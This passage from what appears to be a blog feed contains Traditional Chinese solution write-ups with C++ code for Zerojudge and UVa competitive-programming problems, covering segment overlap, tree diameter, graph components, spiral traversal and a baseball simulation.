<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>翻轉複雜度為 $O(rc)$<br>旋轉複雜度為 $O(rc)$<br>單筆測資複雜度為 $O(mrc)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b966</title>
    <url>/2020/06/27/Zerojudge%20b966/</url>
    <content><![CDATA[<h1 id="Zerojudge-b966"><a href="#Zerojudge-b966" class="headerlink" title="Zerojudge b966"></a>Zerojudge b966</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b966" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b966</a><br>給定多個線段，求所有線段除去覆蓋部分的長度總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>將所有線段排序後將完全覆蓋的線段除去<br>接下來的線段只需討論是否有重疊部分，若有，則將線段界線更新</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; v,res;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,l,r ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">		v.emplace_back(l,r);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(v.begin(),v.end());</span><br><span class="line">	<span class="keyword">int</span> Max=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: v)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i.second&gt;Max)&#123;</span><br><span class="line">			res.push_back(i);</span><br><span class="line">			Max=i.second;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;res.size()<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(res[i].second&gt;=res[i+<span class="number">1</span>].first)&#123;</span><br><span class="line">			res[i+<span class="number">1</span>].first=res[i].first;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			ans+=res[i].second-res[i].first;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans+=res[res.size()<span class="number">-1</span>].second-res[res.size()<span class="number">-1</span>].first;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>排序複雜度 $O(nlogn)$<br>搜尋答案複雜度 $O(n)$<br>總複雜度 $O(n+nlogn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b967</title>
    <url>/2020/06/27/Zerojudge%20b967/</url>
    <content><![CDATA[<h1 id="Zerojudge-b967"><a href="#Zerojudge-b967" class="headerlink" title="Zerojudge b967"></a>Zerojudge b967</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b967" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b967</a><br>相當於求樹直徑</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以證明透過兩次DFS即可求解<br>證明過程可參閱 <a href="https://www.itread01.com/content/1549861926.html" target="_blank" rel="noopener">https://www.itread01.com/content/1549861926.html</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">pii far;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v[<span class="number">100005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> last,<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	far = max(far,&#123;depth,now&#125;);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: v[now])&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==last)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		dfs(i,now,depth+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			v[i].clear();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,a,b ; i&lt;n<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">			v[a].push_back(b);</span><br><span class="line">			v[b].push_back(a);</span><br><span class="line">		&#125;</span><br><span class="line">		far = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">		dfs(<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">		dfs(far.second,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;far.first&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>DFS複雜度為 $O(n)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>Tree</tag>
        <tag>樹直徑</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c291</title>
    <url>/2020/06/29/Zerojudge%20c291/</url>
    <content><![CDATA[<h1 id="Zerojudge-c291"><a href="#Zerojudge-c291" class="headerlink" title="Zerojudge c291"></a>Zerojudge c291</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c291" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c291</a><br>給每個人跟誰屬於同一個群體，求總群體個數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>將所有人的關係建成圖，DFS每個點即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; Next[<span class="number">50005</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">50005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> px)</span></span>&#123;</span><br><span class="line">	vis[px]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">bool</span> end=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: Next[px])&#123;</span><br><span class="line">		<span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">			dfs(i);</span><br><span class="line">			end=<span class="literal">false</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(end)</span><br><span class="line">		ans++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,tmp ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">		Next[i].push_back(tmp);</span><br><span class="line">		Next[tmp].push_back(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">			dfs(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>DFS複雜度為 $O(n)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c290</title>
    <url>/2020/06/29/Zerojudge%20c290/</url>
    <content><![CDATA[<h1 id="Zerojudge-c290"><a href="#Zerojudge-c290" class="headerlink" title="Zerojudge c290"></a>Zerojudge c290</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c290" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c290</a><br>給一個10位數，不超過1000位數，求奇數和與偶數位數合之差的絕對值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>數字用字串儲存，接下來將奇數位數與偶數位數算出來即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">	<span class="keyword">bool</span> A=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=s.size()<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(A)</span><br><span class="line">			a+=(s[i]-<span class="string">'0'</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			b+=(s[i]-<span class="string">'0'</span>);</span><br><span class="line">		A=!A;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">abs</span>(a-b)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s))$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c292</title>
    <url>/2020/06/29/Zerojudge%20c292/</url>
    <content><![CDATA[<h1 id="Zerojudge-c292"><a href="#Zerojudge-c292" class="headerlink" title="Zerojudge c292"></a>Zerojudge c292</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c292" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c292</a><br>給一個二維正方形陣列，邊長為奇數，求從中心點開始向指定方向開始走(上/下/左/右)，繞圈走過的元素依照走訪順序輸出</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>模擬一遍即可<br>我的作法是記錄現在走訪到哪裡，接下來要往哪個方向走多少距離<br>將走過點的值儲存到一個陣列中<br>需要留意在最後一次走訪時前進距離會少1</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,st,arr[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="keyword">int</span> row=<span class="number">1</span>,col=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> last=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> face)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(col+row == <span class="number">2</span>*n+<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(st%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; col+row==<span class="number">2</span>*n)</span><br><span class="line">		last=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(st%<span class="number">2</span>==<span class="number">1</span> &amp;&amp; col+row==<span class="number">2</span>*n)</span><br><span class="line">		last=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(face==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">//left</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=col-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x][y-i]);</span><br><span class="line">		&#125;</span><br><span class="line">		col++;</span><br><span class="line">		solve(x,y-(col<span class="number">-1</span>),<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="comment">//up</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=row-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x-i][y]);</span><br><span class="line">		&#125;</span><br><span class="line">		row++;</span><br><span class="line">		solve(x-(row<span class="number">-1</span>),y,<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="comment">//right</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=col-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x][y+i]);</span><br><span class="line">		&#125;</span><br><span class="line">		col++;</span><br><span class="line">		solve(x,y+(col<span class="number">-1</span>),<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="comment">//down</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=row-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x+i][y]);</span><br><span class="line">		&#125;</span><br><span class="line">		row++;</span><br><span class="line">		solve(x+(row<span class="number">-1</span>),y,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;st;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">	ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[n/<span class="number">2</span>][n/<span class="number">2</span>]);</span><br><span class="line">	solve(n/<span class="number">2</span>,n/<span class="number">2</span>,st);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每個點走訪一遍，每個點走訪時間複雜度為 $O(1)$<br>總複雜度 $O(n^2)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c297</title>
    <url>/2020/06/29/Zerojudge%20c297/</url>
    <content><![CDATA[<h1 id="Zerojudge-c297"><a href="#Zerojudge-c297" class="headerlink" title="Zerojudge c297"></a>Zerojudge c297</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c297" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c297</a><br>給一場棒球各球員打擊的狀況，求在總出局為 $b$ 時，分數為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>跟著模擬一遍壘包上的狀況即可<br>記得在出局數為3時要重新開始</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> stat[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> out=<span class="number">0</span>,out_tot=<span class="number">0</span>,point=<span class="number">0</span>,bat_time=<span class="number">0</span>,b;</span><br><span class="line"><span class="keyword">bool</span> base[<span class="number">4</span>];<span class="comment">//home, 1, 2, 3 base</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> bases)</span></span>&#123;</span><br><span class="line">	base[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span>(bases--)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(base[i])&#123;</span><br><span class="line">				base[i]=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">if</span>(i==<span class="number">3</span>)</span><br><span class="line">					point++;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					base[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	base[<span class="number">0</span>]=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,n ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">		bat_time=max(bat_time,n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ;  j++)</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;stat[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;bat_time ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">9</span> ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(stat[j][i][<span class="number">1</span>] == <span class="string">'O'</span>)&#123;</span><br><span class="line">				out++;</span><br><span class="line">				out_tot++;</span><br><span class="line">				<span class="keyword">if</span>(out_tot == b)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;point&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(out == <span class="number">3</span>)&#123;</span><br><span class="line">					<span class="built_in">memset</span>(base,<span class="literal">false</span>,<span class="keyword">sizeof</span>(base));</span><br><span class="line">					out=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'1'</span>) run(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'2'</span>) run(<span class="number">2</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'3'</span>) run(<span class="number">3</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(stat[j][i][<span class="number">0</span>] == <span class="string">'H'</span>) run(<span class="number">4</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $na$ 筆資料，每筆資料轉移時間複雜度為 $O(1)$<br>總複雜度 $O(na)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11084</title>
    <url>/2020/06/17/UVa11084/</url>
    <content><![CDATA[<h1 id="UVa11084"><a href="#UVa11084" class="headerlink" title="UVa11084"></a>UVa11084</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11084" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11084</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先暴力枚舉出數字的排列組合<br>再個別轉換成數字比較是否可以整除</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,d,ans,cnt[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">long</span> <span class="keyword">long</span> res)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == s.size())&#123;</span><br><span class="line">		<span class="keyword">if</span>(res%d == <span class="number">0</span>)&#123;</span><br><span class="line">			ans++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(cnt[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			cnt[i]--;</span><br><span class="line">			dfs(depth+<span class="number">1</span>, res*<span class="number">10</span> + i);</span><br><span class="line">			cnt[i]++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="comment">//initialize</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; 